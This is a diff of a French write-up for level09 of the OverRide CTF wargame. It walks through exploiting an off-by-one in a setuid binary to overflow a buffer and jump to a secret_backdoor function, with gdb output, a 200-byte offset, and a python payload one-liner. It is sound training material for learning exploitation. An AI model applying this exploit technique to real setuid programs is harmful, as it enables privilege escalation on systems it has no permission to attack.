@@ -20,14 +20,6 @@ en decompilant avec https://dogbolt.org/?id=f1613b2e-2c3d-4b75-97e9-8137a7378884
 
 on voit tout de suite la fonction secret_backdoor qui nous permettra d'executer n'importe quel commande avec les droit de end 
 
-level09@OverRide:~$ ls -l
-total 16
--rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
-level09@OverRide:~$
-level09@OverRide:~$ file level09
-level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
-
-
 avec la boucle for:
 
   for ( i = 0; i <= 40 && s[i] != 0; ++i )
@@ -60,7 +52,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 Segmentation fault (core dumped)
 level09@OverRide:~$
 
-j'ai reussi a overide eip
+j'ai reussi a overide eip car on a un segfault
 
 teston dans gdb 
 
@@ -69,6 +61,7 @@ run < <(python -c 'import sys; sys.stdout.write(b"A"*40 + b"\xff" + b"\n")'; cat
 comme le binaire est PIE
 level09@OverRide:~$ readelf -h ./level09 | grep Type
   Type:                              DYN (Shared object file)
+
 
 (gdb) disassemble set_msg
 Dump of assembler code for function set_msg:
@@ -124,10 +117,6 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 
 Program received signal SIGSEGV, Segmentation fault.
 0x0000555555554931 in handle_msg ()
-(gdb)  r
-The program being debugged has been started already.
-Start it from the beginning? (y or n) n
-Program not restarted.
 (gdb) i r
 rax            0xd      13
 rbx            0x0      0
@@ -157,6 +146,7 @@ gs             0x0      0
 0x7fffffffe5c8: 0x37674136
 (gdb)
 
+0x7fffffffe5c8 est rsp soit (esp en 32bits) et les 4 octets suivant sont les octets de saved eip
 
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 0x37674136 == offset 200 donc on sait qu'il y auras 200octets avant de pouvoir overide eip
@@ -177,6 +167,7 @@ level09@OverRide:~$ cat /proc/sys/kernel/randomize_va_space
 
 0x000055555555488c  secret_backdoor
 
+donc on fait un script qui vas dans le username fill de 40 octets de 'A' puis 'ff' pour overide la var max_msg_len puis dans le message fill de NOPS et l'addr de la secret backdoor 
 
 level09@OverRide:~$ (python /tmp/sc.py; cat) | ./level09
 --------------------------------------------
